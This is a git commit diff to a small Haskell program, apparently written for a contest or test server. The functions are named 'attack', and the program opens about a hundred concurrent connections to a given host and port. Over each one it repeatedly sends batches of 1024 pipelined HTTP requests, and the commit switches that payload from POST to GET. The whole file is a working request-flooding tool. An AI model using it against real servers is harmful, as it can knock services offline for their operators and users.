46c5845017fa986e89899c1b2b6bd0ccc6b3c57c
Robert Glossop <robgssp@gmail.com>
2016-05-30 16:31:20 -0400

    new protocol

--- basic.hs
+++ basic.hs
@@ -10,7 +10,6 @@ import System.Environment
 main = do
   [host, port] <- getArgs
   sh <- connectTo host $ PortNumber $ fromIntegral $ read port
-  B.hPutStr sh "POST /register/robgssp HTTP/1.1\r\n\r\n"
   forM_ ([0..98]::[Int]) $ \_ -> forkIO (attack host (fromIntegral (read port)))
   attack1 sh
 
@@ -18,13 +17,10 @@ attack host port = (connectTo host $ PortNumber port) >>= attack1
 
 attack1 sh = do
   forkIO $ do
-    -- let sz = 1024*1024
-    -- buf <- mallocBytes sz
-    -- forever $ hGetBuf sh buf sz >> return ()
     forever $ B.hGet sh (1024*1024)
   forever $ do
     B.hPutStr sh prepmsg
     putStrLn "hit"
 
 prepmsg :: B.ByteString
-prepmsg = B.concat $ take 1024 $ repeat "POST /robgssp HTTP/1.1\r\n\r\n"
+prepmsg = B.concat $ take 1024 $ repeat "GET /robgssp HTTP/1.1\r\n\r\n"
